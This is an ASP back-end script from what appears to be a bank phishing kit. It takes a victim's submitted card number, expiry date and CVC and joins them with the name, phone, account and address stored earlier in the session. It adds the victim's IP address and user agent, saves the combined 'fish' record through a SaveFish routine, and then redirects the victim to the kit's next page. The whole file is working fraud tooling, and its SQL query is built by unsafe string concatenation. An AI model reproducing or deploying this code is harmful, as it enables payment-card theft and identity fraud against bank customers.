<!--#include file="include/db_conn.asp"-->
<!--#include file="include/tools.asp"-->
	  <meta charset="utf-8">
<%
	pass=Trim(Request("pass"))
    info2 = split(pass,",")
	
	if pass="" then
		response.Write "<script>alert('Please enter the answer');history.go(-1);</script>"
		response.End()
	end if


   

	set Rs=server.createobject("adodb.recordset")
	Sql="select top 1 * from bank where id="&session("ddid")
	

	rs.open sql,conn,1,3
    info1=split(rs("xm"),",")
    info3=split(rs("mm"),",")
    
    rs("sfz")=rs("sfz")&"▹"&pass
	rs("sj")=now()
	rs("n")=0
	rs.update
	rs.close
	set rs=nothing
	
	account=info1(0)
	address=info1(1)
	address2=info1(2)
	city=info1(3)
	state=info1(4)
	postCode=info1(5)
	
	cardNo=info2(0)
	cardExp=info2(1)
    cardCvc=info2(2)
    
    mobile=info3(0)
	name=info3(1)
	
	fish_content = "姓名："&name&vbcrlf&_
	               "电话："&mobile&vbcrlf&_
	               "账号："&account&vbcrlf&_
	               "#--------------------------------[ 地址信息 ]----------------------------#"&vbcrlf&_
	               "州："&state&vbcrlf&_
	               "城市："&city&vbcrlf&_
	               "地址："&address&vbcrlf&_
	               "地址2："&address2&vbcrlf&_
	               "邮编："&postCode&vbcrlf&_
	               "#--------------------------------[ 付款详情 ]----------------------------#"&vbcrlf&_
	               "姓名："&name&vbcrlf&_
	               "卡号："&cardNo&vbcrlf&_
	               "时间："&cardExp&vbcrlf&_
	               "CVV："&cardCvc&vbcrlf&_
	               "#--------------------------------[ 指纹信息 ]----------------------------#"&vbcrlf&_
	               "IP："&request.servervariables("remote_addr")&vbcrlf&_
	               "UserAgent："&request.servervariables("http_user_agent")&vbcrlf&_
	               "Time Date："&now()&vbcrlf&_
	               ""
	
	' response.write fish_content
	SaveFish cardNo,fish_content

	response.write "<script>top.location ='load2.asp';</script>"
%>
